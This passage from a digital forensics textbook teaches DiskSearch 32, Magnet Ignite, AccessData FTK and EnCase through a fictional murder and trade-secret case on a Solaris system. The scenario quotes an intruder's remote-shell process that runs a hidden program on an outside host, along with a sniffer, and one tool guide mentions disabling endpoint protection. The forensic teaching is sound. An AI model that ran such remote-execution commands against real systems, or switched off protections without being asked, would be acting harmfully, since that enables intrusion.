|   || \* || 80 || Linux swap || 755 || 1 || 1 || 763 || 254 || 63 || 72261 |
|   || \* || 80 || DOS EXT || 764 || 0 || 1 || 788 || 254 || 63 || 200812 |
| D: || \* || 80 || FAT16 > 32MB || 764 || 1 || 1 || 788 || 254 || 63 || 200781 |

*   To view the manual: NTICOPY MAN | MORE <enter>
*   To print the manual: NTICOPY MAN > PRN <enter>
*   To copy the manual to a file: NTICOPY MAN > FILENAME <enter>

### DiskSearch 32

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inil.com](http://www.forensics-inil.com)*
*   *ds32.exe*

DiskSearch 32 and DiskSearchPro are similar tools. The details for DiskSearch 32 will now be covered.

To start the DiskSearch 32 program, type:

 DS32 <ENTER>

When starting the program, choose <continue>. Then you will see a menu-type program. The menu across the top, from left to right, reads\*.

*   Drive: An entire hard drive, specific DOS volumes (C, D, etc.), or a diskette drive (A or B) can be searched. Either press the keys Alt-D (hold down the Alt key then press the D key) or click on Drive with the mouse.
*   Source: You have the option of either typing in the words to be searched for from the keyboard or telling source that there are words stored in a file that you created earlier and you want source to use this file.
*   Options: You can choose any or all of the following: 
    
    *   Print results to the Screen
    *   Print results to the Printer
    *   Print results to a File
    *   Hear a sound when one of your words is found Skip the system area of the drive/diskette
    
      
    For instance, if you click on Screen, a checkmark goes into the \[ \]. If you click Screen again, the checkmark goes away. As long as the checkmark is present, the function will be performed. If a checkmark is not present, the particular item will not be done.
*   Begin: The keyword search is almost ready to begin. You will be asked to enter a file name if you told the program that your keywords were in a file. If you chose the keyboard option, a screen will be shown. The screen is waiting for you to input the keywords to be searched for on the drive/diskette.
*   View: To only look through the drive/diskette and not search for any particular keyword, click on View with the mouse. Now click on Select to choose the sector you want to look in. Click on ok. Click on Previous or Next as necessary to go backward or forward in the search.

As an example, I want to search a diskette in drive A. Using the mouse, I click on Drive. Then I click on Search Drive in Floppy Drive A.

I click on Source and choose Keyboard, because I will type in the words to be searched for from the keyboard. If I chose File as the source, then the program would later ask for the name of the file that holds the words to be searched for (must be an ASCII text file, not a file such as a Microsoft Word document).

I click on Options and then click on Screen. A checkmark should be next to the word Screen. If not, I would click on Screen again and the checkmark would be present. This means I have chosen to send the results of the search to the computer monitor/screen.

I click on Begin. Because Keyboard was chosen earlier, a screen is presented that is waiting for input of the keywords along with how accurate the search must be (100% = exactly as the word was typed).

I type in each word I want and press the <enter> key after each word and after each percent. Once completed, I use the <tab> key to go to the OK button and press <enter>.

I now see the Search in Progress window. As I see each result, I press the Continue button to tell the program to search for more keyword results. I take notes as I go (or if I told it to also write to a file then the results will be there). When it tells me the search is complete, I click on the OK button. I can now either use my notes or go to the results file I created for further analysis.

To leave the program, I click on Quit. Then I click on Quit to DOS.

## Magnet Forensics

As I mentioned earlier, the tools used above can be used globally in nearly any part of the world today and when writing this book I wanted to be sure I’m mentioning tools that can be used in either first-world, second-world, and third-world countries. Now let’s cover a more modern tool in use today. Remember though that this is not a “tools” book per se since you can obtain the details to run the 100+ tools out there today that handle forensics at the vendor and other websites. This book focuses on the overall forensics process. Nonetheless, let’s do pick a modern forensics tool that can be used during a forensics investigation. Note that although the interface is different and some tools handle more details, what we cover here using the tool “Magnet Ignite” from Magnet Forensics will give you a good idea of what’s involved. Here are the steps you need to follow in order to use this tool:

1.  Create your account.
2.  Go to magnetignite.com and sign in.
3.  Click on “Create New Case.”
4.  Input your case details as directed in the GUI.
5.  Click on “Create Case.”
6.  Enter your keywords and select “Add” to save them OR select “Choose File” in order to upload a text file you have created (one keyword per line in this text file).
7.  Note that the case type will pre-select particular artifact groups and these can be modified in the artifacts section later on.
8.  Now click on “Copy Link” to copy a link to download the agent file.
9.  Click “Download” to download the agent.
10.  Run the agent that you just downloaded on the endpoint of choice. Note that this agent is called IgniteAgent.
11.  It’s possible that you may have to disable endpoint protection (antivirus, etc.) in order to run this agent executable.
12.  The IgniteAgent will indicate what it’s doing, such as scanning, uploading, and processing. Note the progress indicator that shows you how many files are remaining.
13.  Once completed, you will have the opportunity to Review and Share.
14.  Just click on Review to see the results.
15.  You can click on Share in order to create a password-protected link to the Review page.
16.  Now expand the left-hand menu to view the artifact that has been generated. Just click on the artifact to see the details.
17.  Notice that the results you have obtained can be filtered by date, keyword, tags, and various other search terms.
18.  You can now export the results to a CSV, PDF or MFDB file (you will notice that the PDF report includes only the tagged results).
19.  And of course, now you have the information you can further analyze during your investigation.

## Chapter questions

*   1\. What tool fits on a diskette and allows you to quickly obtain slack space from a computer?
*   2\. What tool would you use to encrypt and decrypt files?
*   3\. What tool securely removes residual data from hard drives?
*   4\. What tool has the potential to identify terrorist activities before they take place (such as bomb making, pornography, hate crimes, etc.)?

# Chapter 5 AccessData’s Forensic Toolkit

DOI: [10.1201/9781003134817-5](https://doi.org/10.1201/9781003134817-5)

## Creating a case

Let us work through a case with AccessData’s Forensic Toolkit (ADFTK). Just so you can see what it looks like if no case data has been loaded yet (i.e., starting a brand new case with no loaded sources), let us go through the process (see [Figure 5.1](#c5.xhtml#f5.1)). Of course the version of the tool you are using may be different and as such could look different.

![Figure 5.1 Evidence information.](images/fig5.1.jpg)

*Figure 5.1* Evidence information.

Click OK, which opens the Wizard for Creating a New Case. Enter the Case Information and the Case Description, then click Next.

On the Case Log Option screen, you can select any event to go in the case log. The default selects all. Click Next to go to the Process to Perform screen. Select the processes you want to perform, then click Next, which opens the Refine Case Default screen. This screen lets you chose the data you want to observe. For a new case, click Include All Items, unless you are looking only at very specific data.

Click Next for the Refine Index-Default screen. Here you can choose the data to be indexed, or accept the default.

Click Next to open the Add Evidence to Case screen. This allows you to add, edit, remove, or refine evidence. Click Add Evidence. Because we are analyzing a single file (LIB27.S01) that contains slack space, which was collected from the victim’s computer, choose Individual File, then click Continue. Highlight LIB27.S01, then click Open, which will display the Evidence Information screen. Enter the Evidence Identification Name/Number and Comment ([Figure 5.2](#c5.xhtml#f5.2)), then click OK, which returns you to the Add Evidence to Case screen.

![Figure 5.2 The Add Evidence to Case screen.](images/fig5.2.jpg)

*Figure 5.2* The Add Evidence to Case screen.

The screen in [Figure 5.2](#c5.xhtml#f5.2) allows you to make changes to anything you have done. You can press the Back key to move backward through the screens to make any changes you need. To process the evidence, click the Next button, which displays the Case Summary screen. Click Finish to process the evidence.

After the evidence is successfully processed, save the case as case.dat, then exit the program.

## Working on an existing case

Now let us reopen ADFTK by double-clicking on its icon on the Windows desktop. When ADFTK initializes the first screen, click on Open an Existing Case, then click OK. Notice that ADFTK is set up to be “case friendly.” The case was saved as case.dat, so highlight case.dat, then click Open. You see the screen shown in [Figure 5.3](#c5.xhtml#f5.3).

![Figure 5.3 Highlight case.dat, then click Open.](images/fig5.3.jpg)

*Figure 5.3* Highlight case.dat, then click Open.

Before we move forward with more information pertaining to the forensics tool we are currently discussing, let us learn a little more about the murder case we are investigating.

The President of SaturnNights Corporation, Jack Milner, has arrived at work early one morning at 5 am. When he arrives and begins touring the facility, he finds his administrative assistant, Patty Powace, slumped over a computer in the engineering department. She is dead. The computer is still on. Because SaturnNights develops software for the Federal Bureau of Investigation (FBI), Central Intelligence Agency (CIA), and Secret Service (projects are classified Top Secret and all personnel working on the projects are cleared TS/SCI/LP), the FBI is called in to investigate. Due to our expert knowledge in the CyberForensics arena, The Middleton Group (TMG) is contacted by the FBI and asked to provide a CFI for the case. The Middleton Group’s HelpDesk has verified the identity of the FBI agent requesting our assistance and has then contacted you via your cellular phone. The FBI does not discuss any details of a sensitive case over the telephone, only in person. You are told by the TMG HelpDesk, “KGN, AJWNAFC, The sun is hot, now.”

Based on your knowledge of TMG CF code words, you recognize that the message indicates that the FBI is involved; you are to go immediately to SaturnNights Corporation and bring any tools you require to work with SUN Solaris systems (SPARC \[Scalar Processor Architecture\] platforms). You ask TMG HelpDesk if your credentials (TS/SCI/LP clearance) have been faxed to the appropriate authority. You receive an affirmative answer. You ensure you have what you need and leave for the site. Due to the type of incident, you will not be bringing your CIRT (computer incident response team) on site. You do, however, contact the appropriate CIRT personnel and let them know that you may be contacting them for assistance.

You arrive at SaturnNights and show your picture ID to the agent at the entrance. He makes a quick check via the telephone, checks your black bag, and searches you; then an escort arrives and takes you to the crime scene on the eighth floor. You are told by the FBI agent (Larry Ryan) that the body has been removed and fingerprint and DNA samples have been gathered. Other than that, nothing else has been touched.

Larry states that in 15 minutes he will return to take you to the pre-briefing area. He directs you to use that time to write down anything you need or any questions you might have.

What do you want to learn in the pre-briefing (what do you write down)? Normally you would be working off of a generic checklist and customize it to the situation at hand. What do you want to tell people in the pre-briefing?

The answers to these questions are as follows:

*   Can you provide me with an overview of what has happened here?
*   Was Patty supposed to be there?
*   Who was the last person to see her?
*   Does she normally work late?
*   What were her work patterns?
*   How was she murdered?
*   What time was she murdered?
*   What was on the computer screen?
*   What was she working on?
*   When was the system last backed up?
*   How long had she been with the company?
*   Did she have any incidents with other employees lately?
*   Did she mention anything strange happening to her lately (followed, phone calls, e-mails)?
*   What programs/contracts were she involved with?
*   Does anything look different about her regular work area?
*   What level of access did she have (physical and computer)?
*   Are there any cameras in the area that could have tracked her or others in the area?
*   Are there any entrance/access logs into/out of building and areas?
*   Was her account accessed at any time after she was murdered?
*   Did Patty have any financial problems that anyone knows of?
*   Did Patty take any unusual trips?
*   Had she been spending more money than usual (new car, clothes, etc.)?
*   Did she have any unusual personal traits?
*   Had Patty been reprimanded in the past for system abuse or any other issues?
*   Was she having marital or relationship problems?
*   How was she dressed?
*   Did she go home first then come back or was she there all day?
*   Who else had access to the area?
*   Was she really murdered at this machine or was she moved here?
*   Did she have the knowledge to operate a SUN SPARC system?
*   What type of work is SaturnNights involved with (projects, etc., current and past)?
*   Who first noticed (and at what time)? Jack Milner was the first to report, but did he first notice?
*   Did the person who noticed touch anything besides the telephone?
*   Does anyone else in the company know of this?
*   Based on records from physical security, what time did Patty arrive in the building?
*   Based on records from physical security, was anyone else in the building while Patty was in the building?
*   Who usually uses the Solaris system where Patty was found?
*   When was the last time they used it?
*   What was the purpose of that specific system?
*   Who else works in this area where Patty was found?
*   Who else has access to this area where Patty was found?
*   Why do you think there was a break-in? (Just trying to get people to talk.)
*   Why do you think Patty was killed?
*   Do we have any suspects?
*   May I have a copy of SaturnNights’ security policy/procedures?
*   Do not touch anything. Do not turn off power to the computer system.
*   I would like to have access to any records available for the Solaris system involved (we will now call it Solaris 1), such as purchasing records (see original configuration of the system) and service records (modifications, problems the system had, etc.).
*   I would like a diagram of the network architecture.
*   I need the system expert for Solaris 1, a network infrastructure expert, and a software application expert to meet with me.
*   What are the names of some hotels close by where I can stay?
*   Can the client have some food available to me while I am working?
*   Does the crime scene area forbid or preclude the use of electronic communication devices such as cell phones, pagers, etc.?
*   Briefly spell out to those in the pre-briefing the evidence collection procedure that will be followed.
*   Was the system serviced recently?
*   Were any new applications recently added to Solaris 1?
*   Were any patches or operating system upgrades recently done on Solaris 1?
*   Have any suspicious personnel been in the area of Solaris 1 recently?
*   Are there any known disgruntled employees, contractors, etc.?
*   Have any new contractors, employees, etc. been hired in the past month?
*   Are there any HR- (human resources), union-, or SaturnNights-specific policies or regulations that I need to abide by?

Note that when you carefully read through the questions/statements above, some seem to be somewhat redundant. This is on purpose. You are asking the same question in either a different way (or in the same way) later into the interview process to see whether you obtain the same answer to both questions. This is to help verify what you are being told.

You will not be allowed to use your digital recorder or video recorder. On a supervised basis, you are allowed to use your digital camera for pictures of the screens, etc.

You are now back at the crime scene with a Solaris 1 expert and a network infrastructure specialist. What should be your first step now?

*   If allowed, photograph the crime scene. This includes the area in general, computer monitors, electronic instrument information from devices that are lying around in the area (cell phones, pagers, etc.), and cabling connections (including under the floor if it is a raised floor). Make sketches as necessary. If there is an active modem connection (flashing lights indicating communication in progress), quickly unplug it and obtain internal modem information via an rs-232 connection to your laptop. Look at raised ceilings. Is it normal for a modem to be here? If so, is it normal for it to be active at this time?

You now want to find out whether anyone else is on Solaris 1 (remotely) and what has been going on with the system recently. What UNIX commands should you use?

*   *script a:\\SaturnNightsSolarisEvidence1*: Opens a text file that will store everything you do on this system. Note that we are sending our data to a floppy drive, not to the hard drive of the Solaris system.
*   *Date*: To have the date/time in this log.
*   *Who*: To obtain a list of currently logged in users.

You notice someone on Solarisl named Leopoldl coming from 221-4l-12.galaxy.com. What does this indicate?

> Leopoldl is attached to Solarisl via an ISP named galaxy.com.

You now want to display a list of all recent and current Transmission Control Protocol/Internet Protocol (TCP/IP) connections to the system.

netstat-a

When you performed the last command, you noticed a.telnet at the end of your system name. What does this indicate?

There is a telnet connection between Solarisl and Leopoldl (on 221-41-12.galaxy.com).

You now want to obtain a list of recent logins pertaining to Leopold1.

last Leopold1

The results of your last command indicate that Leopoldl logged in earlier during the day and is currently logged into Solarisl. You want to see all the processes running in memory that Leopoldl is running. What do you type?

ps -aux | grep Leopold1

The results of your last command indicate that the following processes are running that belong to Leopold1: 2365, 2287, 2087, and 2001. In these processes you see two that alarm you. One is “Sniffer” and the other is “256:47 rsh [www.cirrus.com](http://www.cirrus.com) exec/tmp/.hidden/BeatYou.” This indicates the following:

*   “Sniffer” indicates that Leopold1 has planted a device to monitor Solaris1 for logins, user IDs, passwords, specific traffic.
*   The other indicates that for 256 minutes and 47 seconds the program BeatYou has been running on a remote computer system named [www.cirrus.com](http://www.cirrus.com) using the remote shell command rsh.

You notify the FBI agent working with you as to what you have found. He immediately utilizes bureau contacts and gets in touch with the ISP (Internet Service Provider) galaxy.com, then leaves for the ISP site. The ISP also does a traceback while the FBI agent is on site and determines exactly where Leopold1 is coming from. The ISP moves all logs pertaining to Leopold1 to a trusted system and backs them up to a DAT tape. An FBI agent picks up the tape and brings it to you at SaturnNights. You are now directed to remove Leopold1 from the system, collect RAM (Random Access Memory) evidence, and collect all evidence from the Solaris1 hard drive. What steps do you follow to remove Leopold1 and collect RAM evidence?

To remove Leopold1 from the system, just remove all of his processes:

*   kill -9 2365
*   kill -9 2287
*   kill -9 2087
*   kill -9 2001

To collect RAM evidence:

ps -aux > a:\\SolarislRAMproc

This shows you all processes running and collects this information to diskette.

You photograph the screen showing the information on the processes. The Solaris1 expert tells you about each process that is running and tells you there is a battery backup on the box. He opens the box and disconnects it. You now pull the plug on the back of the box, which makes the box shut down ungracefully and causes a panic, and all RAM information is written to a core file.

Solaris 1 is now inactive. The evidence cannot leave the site. You have to do your analysis on site using the CF tools you brought with you. The FBI has supplied you with a “scrubbed” Intel-based PC (personal computer) running Windows XP. Also included are a diskette drive, a CD-ROM drive, and a new external 200-GB hard drive that you will use to hold the bitstream backup of the Solaris 1 system. In this case we will use SafeBack (from NTI \[New Technologies, Inc.\]) to obtain this bitstream backup (we covered its use in a prior chapter).

Now we can pick up where we left off earlier. Lib27.s01 will represent the evidence we have collected from the Solarisl system. [Figure 5.4](#c5.xhtml#f5.4) shows where we are.

![Figure 5.4 Evidence we have collected from the Solarisl system.](images/fig5.4.jpg)

*Figure 5.4* Evidence we have collected from the Solarisl system.

If I click the Total File Items button in the top left pane, I see the entry shown in [Figure 5.5](#c5.xhtml#f5.5) in the bottom pane.

![Figure 5.5 Entry shown in the bottom pane.](images/fig5.5.jpg)

*Figure 5.5* Entry shown in the bottom pane.

Notice in [Figure 5.5](#c5.xhtml#f5.5) that I also placed a check in the checkbox on the left. In the top right pane, I see the partial contents of the LIB27.S01 file, as shown in [Figure 5.6](#c5.xhtml#f5.6).

![Figure 5.6 Partial contents of the LIB27.S01 file.](images/fig5.6.jpg)

*Figure 5.6* Partial contents of the LIB27.S01 file.

Notice the scroll bars on the right. I could scroll through the rest of this file if I so desired. Remember that we are “pretending” that this LIB27.S01 file is the contents of an entire hard drive. If it really were, it would be very time consuming and tedious to scroll through the entire file searching for evidence related to the crime at hand. What we want to do instead is to perform a search. Recall the tabs along the top of the screen in [Figure 5.4](#c5.xhtml#f5.4).

Let us click the Search tab and see what we come up with on the screen shown in [Figure 5.7](#c5.xhtml#f5.7).

![Figure 5.7 Clicking the Search tab.](images/fig5.7.jpg)

*Figure 5.7* Clicking the Search tab.

In the top left pane notice that both Indexed Search and Live Search appear. An indexed search is much faster than a live search because you took the time up front to index the hard drive. This means that when you read in the image of the hard drive, ADFTK took the time to index the drive (i.e., it found everything on the hard drive and put the items into alphanumeric order). As you can imagine, this makes the search function much faster. However, if you do not have time to wait for the drive to index, then you use the live search. In this case, the search engine starts from the beginning of the hard drive and searches through the hard drive sector by sector looking for the search terms (key words, numbers, phrases) that you provide.

Let us take a moment to discuss keyword generation. We will generate a short list of our own here for demonstration purposes. In real life, these keyword lists are already generated, based on the type of case you are working on. For instance, if you are a DEA (Drug Enforcement Administration) agent working a drug-related case you may have a keyword list as follows (this is only a short list to provide you with an example):

*   Cocaine
*   Delivery
*   Heroin
*   Smack
*   Shipped
*   Police

In a murder case, such as this one, a partial list of keywords could be:

*   Poison
*   Knife
*   Weapon

These lists that are already made up are just something to get you started. Based on interviews you do with various personnel, you will be adding various words, numbers, and phrases to the list. Also your list will grow as you search because you will learn more about the case as you progress in your investigation.

If this were a hacker case, you would include terms such as:

*   < Various hacker names and handles >
*   < Names of various hacker tools used to break into systems >

So what keywords are we going to use for this case? One thing you need to keep in mind is what you were told during your interviews. You also need to keep in mind what you may overhear in conversations but were not directly told. You did happen to overhear one of the FBI agents speaking about smelling some type of poison on the victim. You were also told that the company was concerned about a special project being worked codenamed “verivax.” You also noticed that Patty was holding a Zip disk in her hand as she lay there in the chair. It is always good to look for graphics type files also. You always want to include family members in a murder case, along with the names of law enforcement agencies and words like “die” and “dead” because a death is involved. I am including a few other words that would normally be part of a list such as this. Based on what we know so far let us go with these:

*   Patty
*   Trade secret
*   Precaution
*   E-mail
*   Address
*   Zip
*   Poison
*   Gif
*   Contact
*   Police
*   Fail
*   Deliver
*   Sister
*   Brother
*   Mother
*   Father
*   Die
*   Dead
*   Verivax
*   Develop
*   Countermeasures
*   Tools
*   FBI
*   Secret Service
*   Fool
*   Trick

Now that we have a list of keywords contained in a text file (PattyKey.txt), let us import them into ADFTK. First, click Import. In the Import Search Terms screen ([Figure 5.8](#c5.xhtml#f5.8)), highlight PattyKey.txt, then click Open.

![Figure 5.8 PattyKey.txt.](images/fig5.8.jpg)

*Figure 5.8* PattyKey.txt.

The next screen asks, Do you want to show items that have zero hits? Click Yes.

[Figure 5.9](#c5.xhtml#f5.9) shows the search results. Notice that you need to scroll down to see the rest of the keywords we have imported. Now, click on the button labeled Options.

![Figure 5.9 Search results.](images/fig5.9.jpg)

*Figure 5.9* Search results.

In this scenario, we are not going to use any of the options shown in [Figure 5.10](#c5.xhtml#f5.10), but you can see that they would come in quite handy in various situations. Click Cancel to return to our search screen, as shown in [Figure 5.9](#c5.xhtml#f5.9).

![Figure 5.10 Search options.](images/fig5.10.jpg)

*Figure 5.10* Search options.

Click the Or button, then the View Cumulative Results> button. The Or button means we want to view each of our search items independent of each other. For example, we will settle for finding either Patty or Trade Secret. We do not have to find both terms. Now, in the right-hand pane we see that we have come up with 375 hits. This is too many for an initial run. Let us reduce it by taking out the words “Gif” and “Address” (because they generated 138 and 178 hits, respectively), then we will run our search again.

Note that it is quite simple to remove words from your search list. Just highlight the word, then click the Remove Item button. With the words Gif and Address removed from the search terms, we now see 59 hits ([Figure 5.11](#c5.xhtml#f5.11)), which is much more manageable for our initial review of the hard drive. I have been using the word “hard drive” loosely. What we are really looking at is the slack space on the hard drive, which is the area between the logical end of a file and its physical end. Slack space was explained elsewhere in this book. Recall that in the slack space you end up with portions of documents, conversations, e-mails, system statements, etc. This is where the computer system dumps stuff.

![Figure 5.11 Search with the words “Gif” and “Address” removed.](images/fig5.11.jpg)

*Figure 5.11* Search with the words “Gif” and “Address” removed.

A click on the + sign yields us the information shown in [Figure 5.12](#c5.xhtml#f5.12) in these sections of the top right pane.

![Figure 5.12 Information shown by clicking on + sign.](images/fig5.12.jpg)

*Figure 5.12* Information shown by clicking on + sign.

The key items to note in the text are as follows:

*   Patty has been given a code name, Honeylady.
*   Patty was told to transfer trade secret information to a Zip disk.
*   Patty was to e-mail someone named Ghent the trade secret information.
*   Patty was provided with Ghent’s e-mail address.
*   Patty’s sister is in danger of being killed if Patty does not deliver the trade secret information or if she contacts the police.
*   The trade secret information has something to do with the verivax project. Obtaining this trade secret information may allow these criminals to develop some type of countermeasure to tools being developed for the FBI and Secret Service.
*   There was some type of skin poison on the Zip disk that Patty was working with. The purpose of the skin poison is to eliminate Patty.

Obviously the items we have discovered in the slack space of the system drive will be of immense importance to the law enforcement personnel investigating this case. Finding information of this type on hard drives is quite normal. Deleting logs, files, and other items, along with formatting the hard drive, will not erase this information. Forensics tools have the capability to find this data in slack space, swap space, RAM slack, and other locations throughout the hard drive. Even though we will not go into this in this book, microscopy techniques can be used to derive even more information.

When you think about it, we have really come a long way. We started with a 100-GB hard drive full of data and extracted the slack space from it into a file we called LIB27.S01. This raw file still was a considerable challenge because a large portion of the contents looked like that in [Figure 5.13](#c5.xhtml#f5.13).

![Figure 5.13 Raw file contents.](images/fig5.13.jpg)

*Figure 5.13* Raw file contents.

I should also point out that when I click on one of the lines that occur in the top right pane, I see (in the bottom pane, shown in [Figure 5.14](#c5.xhtml#f5.14)) data on the hard drive that surrounds the found information (lines above and below), just as it appears on the hard drive itself.

![Figure 5.14 Data on the hard drive that surrounds the found information.](images/fig5.14.jpg)

*Figure 5.14* Data on the hard drive that surrounds the found information.

AccessData’s FTK can do more than we have demonstrated here, and if you would like further information (or training) on forensic products from AccessData, you can visit them at [http://www.AccessData.com](http://www.accessdata.com).

We will move on now to another tool in our arsenal: Guidance Software’s “EnCase.” Let us now take a look at the same file (LIB27.S01) using EnCase. We will assume the same scenario as before.

## Chapter questions

*   1\. What function does AccessData’s FTK excel at?
*   2\. How many file formats can you view using AccessData’s FTK?
*   3\. Is AccessData’s FTK compatible with their “Password Recovery Toolkit” and “Distributed Network Attack”?
*   4\. Which types of e-mail and Zip files can be analyzed using AccessData’s FTK?

# Chapter 6 Guidance Software’s EnCase

DOI: [10.1201/9781003134817-6](https://doi.org/10.1201/9781003134817-6)

Please keep in mind here that the goal is not to show you all the different things EnCase can do. The focus here is on showing you how to use EnCase to solve the same case we just covered with AccessData’s forensic tool. Again, the version of the tool you use may be different than the one I am using and as such could look different.

Note that you can acquire evidence (bitstream backup) on any computer that is running Microsoft Windows or the DOS operating system; however, you can analyze the evidence files only on computers running one of the following operating systems; i.e., the evidence files must be placed on one of the following types of systems: Windows 98, Windows ME, Windows NT, Windows 2000, or Windows XP.

We will begin first with EnCase 3 and later solve a case with EnCase 4. [Figure 6.1](#c6.xhtml#f6.1) is the opening EnCase 3 screen.

![Figure 6.1 Opening EnCase 3 screen.](images/fig6.1.jpg)

*Figure 6.1* Opening EnCase 3 screen.

To acquire an image, click on Acquire. Then, on the Create An Evidence File screen ([Figure 6.2](#c6.xhtml#f6.2)) click Next to accept the defaults.

![Figure 6.2 Create An Evidence File screen.](images/fig6.2.jpg)

*Figure 6.2* Create An Evidence File screen.

Notice in [Figure 6.3](#c6.xhtml#f6.3) that we see only drive A:. This is because we chose to see only floppy drives in the prior diagram. Had we chosen volumes instead, we would have seen multiple drives (at least on my system – on yours it could be different, depending on how you set up your hard drive).

![Figure 6.3 Choose a drive screen. Only drive A: appears because we chose to see only floppy drives.](images/fig6.3.jpg)

*Figure 6.3* Choose a drive screen. Only drive A: appears because we chose to see only floppy drives.

Click Next and you will get the warning shown in [Figure 6.4](#c6.xhtml#f6.4). Click Yes to acknowledge that the drive contents may change. For a regular investigation you would click No here and ensure that there is a write block on drive E:. In our case for this example, click Yes to continue to the Identification screen ([Figure 6.5](#c6.xhtml#f6.5)).

![Figure 6.4 Warning.](images/fig6.4.jpg)

*Figure 6.4* Warning.

![Figure 6.5 Identification screen.](images/fig6.5.jpg)

*Figure 6.5* Identification screen.

Notice in [Figure 6.5](#c6.xhtml#f6.5) that I had to fill in various fields. The Unique Description and Current Time fields are filled in for you. Click Next for the Analysis Options screen. In the Add Evidence File to Case box, click Add and verify, then click Next for the Output File options.

[Figure 6.6](#c6.xhtml#f6.6) shows that the following parameters were selected: No file compression; No password use, although a password is optional; and the other items were automatically filled in. Click Finish to create an evidence file.

![Figure 6.6 Output file options.](images/fig6.6.jpg)

*Figure 6.6* Output file options.

The image file (also called the evidence file or bitstream backup) has now been acquired ([Figure 6.7)](#c6.xhtml#f6.7). Click No because there are no additional floppies from which to acquire data.

![Figure 6.7 Notification that the image file has been acquired.](images/fig6.7.jpg)

*Figure 6.7* Notification that the image file has been acquired.

[Figure 6.8](#c6.xhtml#f6.8) shows the case after the image file is acquired. This is an overall view of the screen. It provides you with a good look at how the screen is laid out. Notice that the evidence file, LIB27.S01, is the first file listed in the right pane. Use the scroll bar along the bottom to see the rest of the screen.

![Figure 6.8 The case file.](images/fig6.8.jpg)

*Figure 6.8* The case file.

As you can see in [Figure 6.8](#c6.xhtml#f6.8), multiple columns and tabs indicate that EnCase can perform many other functions, which we will not cover here. Guidance Software ([http://www.guidancesoftware.com](http://www.guidancesoftware.com)) offers numerous classes in how to work with the other aspects of EnCase that we will not cover here. Our focus, as stated earlier, will remain on showing how EnCase is used to solve our current case.

Click on each of the checkmarks (under Table in [Figure 6.8](#c6.xhtml#f6.8)) except for our evidence file LIB27.s01 to eliminate them. We will focus on that file only because we are using it as the slack space we have recovered from the hard drive of the system at which the victim was sitting. Notice that the LIB27.s01 file is highlighted. This indicates we can see its contents, as shown in [Figure 6.9](#c6.xhtml#f6.9).

![Figure 6.9 Contents of LIB27.S01.](images/fig6.9.jpg)

*Figure 6.9* Contents of LIB27.S01.

What we currently observe is a hodgepodge of ASCII text data that really does not mean anything to us at this time. Let us move along. On the right side there is a scroll bar that allows you to scroll through the rest of the file contents. I can highlight any of the text and right-click, which provides a context menu ([Figure 6.10](#c6.xhtml#f6.10)).

![Figure 6.10 LIB27.S01 file context menu.](images/fig6.10.jpg)

*Figure 6.10* LIB27.S01 file context menu.

Click on Bookmark Data for the Add Bookmark screen ([Figure 6.11](#c6.xhtml#f6.11)). Click OK to save the highlighted text as a bookmark in a section of the final report.

![Figure 6.11 The Add Bookmark screen.](images/fig6.11.jpg)

*Figure 6.11* The Add Bookmark screen.

If you wish to export this text to a file, click on Export ([Figure 6.10](#c6.xhtml#f6.10)). To export ([Figure 6.12](#c6.xhtml#f6.12)), enter the output file name, select the appropriate radio buttons, and then click OK.

![Figure 6.12 Export view.](images/fig6.12.jpg)

*Figure 6.12* Export view.

The Copy selection ([Figure 6.10](#c6.xhtml#f6.10)) allows you to do a cut and paste to another document. The Go To option allows you to move to another offset. Options provides you with the ability to display nontext characters as periods and to fit lines to a page for easier reading. If you do not choose Fit Lines To Page, then you will be asked where you want the line breaks to occur.

The Hex tab ([Figure 6.13](#c6.xhtml#f6.13)) allows you to see the file contents in hex along with an ASCII text translation on the right-hand side. A right click on any selected data provides you with the first four selections you had under the Text tab: Bookmark Data, Export, Copy, and Go To ([Figure 6.10](#c6.xhtml#f6.10)).

![Figure 6.13 The Hex tab allows you to see the file contents in hex along with an ASCII text translation.](images/fig6.13.jpg)

*Figure 6.13* The Hex tab allows you to see the file contents in hex along with an ASCII text translation.

The Disk tab ([Figure 6.14](#c6.xhtml#f6.14)) allows you to see a sector or cluster view of the subject file (LIB27.s01). Clicking on any square will show the contents of the hard drive at that sector/cluster location in the right bottom pane.

![Figure 6.14 Clicking on any square will show the contents of the hard drive at that sector/cluster location.](images/fig6.14.jpg)

*Figure 6.14* Clicking on any square will show the contents of the hard drive at that sector/cluster location.

A right click on one of the file names, such as LIB27.s01, opens a context menu ([Figure 6.15](#c6.xhtml#f6.15)). This context menu allows you to realize that EnCase can handle a number of other things here related to the evidence file. These items are not pertinent to this case from our current perspective, but EnCase allows other operations.

![Figure 6.15 Context menu in which EnCase allows other operations.](images/fig6.15.jpg)

*Figure 6.15* Context menu in which EnCase allows other operations.

Recall now that we have a checkmark in the checkbox to the left of our LIB27.s01 file ([Figure 6.15](#c6.xhtml#f6.15)). This is pertinent to the searching capability of EnCase. It tells EnCase which file to search. This is particularly important if a large number of files exist and you want to search through a few of them.

To search, click on the Keywords tab, then place the cursor in the right pane gray area and right-click ([Figure 6.16](#c6.xhtml#f6.16)). You can perform a search in two ways ([Figure 6.17](#c6.xhtml#f6.17)). You can use either the New Keyword function or the Import function. The New Keyword function allows you to type in one keyword at a time and build a list on the fly.

![Figure 6.16 Starting a search.](images/fig6.16.jpg)

*Figure 6.16* Starting a search.

![Figure 6.17 Search options.](images/fig6.17.jpg)

*Figure 6.17* Search options.

The other way to set up your search terms is to build a list of search terms in a text file (using Notepad, for instance), then import the text file into EnCase. This is a more efficient means of developing a search list when you have a larger number of search terms you wish to utilize. To do this, right-click on the Text column (or gray area beneath it) again and select Import.

Open your text file, do a control A to select all the words in it, do a control C to copy all those words, then do a control P to paste them into the Import screen ([Figure 6.18](#c6.xhtml#f6.18)).

![Figure 6.18 Imported search term list.](images/fig6.18.jpg)

*Figure 6.18* Imported search term list.

In our case, if you scroll down you will see even more keywords. Notice that the keywords being used now vary somewhat from what we used in the earlier case using the AccessData tool. I could have used the same ones, but I just wanted you to get a better idea of keyword lists and the type of words to place in them. Click the Import button ([Figure 6.18](#c6.xhtml#f6.18)) to see the search terms ([Figure 6.19](#c6.xhtml#f6.19)).

![Figure 6.19 Search results.](images/fig6.19.jpg)

*Figure 6.19* Search results.

Clicking the checkbox next to each keyword on the left will place a blue checkmark in the box. This allows you to select particular keywords to search on in case you do not want to search on all of them. In our case, we will place a blue checkmark in the checkbox next to the key in the top left pane so that all keywords are automatically chosen.

